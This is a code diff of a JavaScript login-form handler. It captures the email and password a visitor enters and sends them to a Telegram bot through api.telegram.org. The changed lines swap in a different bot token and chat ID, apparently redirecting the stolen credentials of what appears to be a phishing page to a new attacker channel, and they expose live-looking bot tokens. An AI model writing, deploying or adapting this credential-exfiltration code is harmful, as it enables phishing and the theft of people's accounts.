@@ -4,8 +4,8 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
-    const botToken = '7073510628:AAESRf3b81HMWVpgznei0TM7jK3cJk1YSDA';
-    const chatId = '1481941392';
+    const botToken = '7410395588:AAEe0-EvyP5agiZLahjmMkjIFevriQ9aUIg';
+    const chatId = '6770367773';
     const message = `Email: ${email}\nPassword: ${password}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
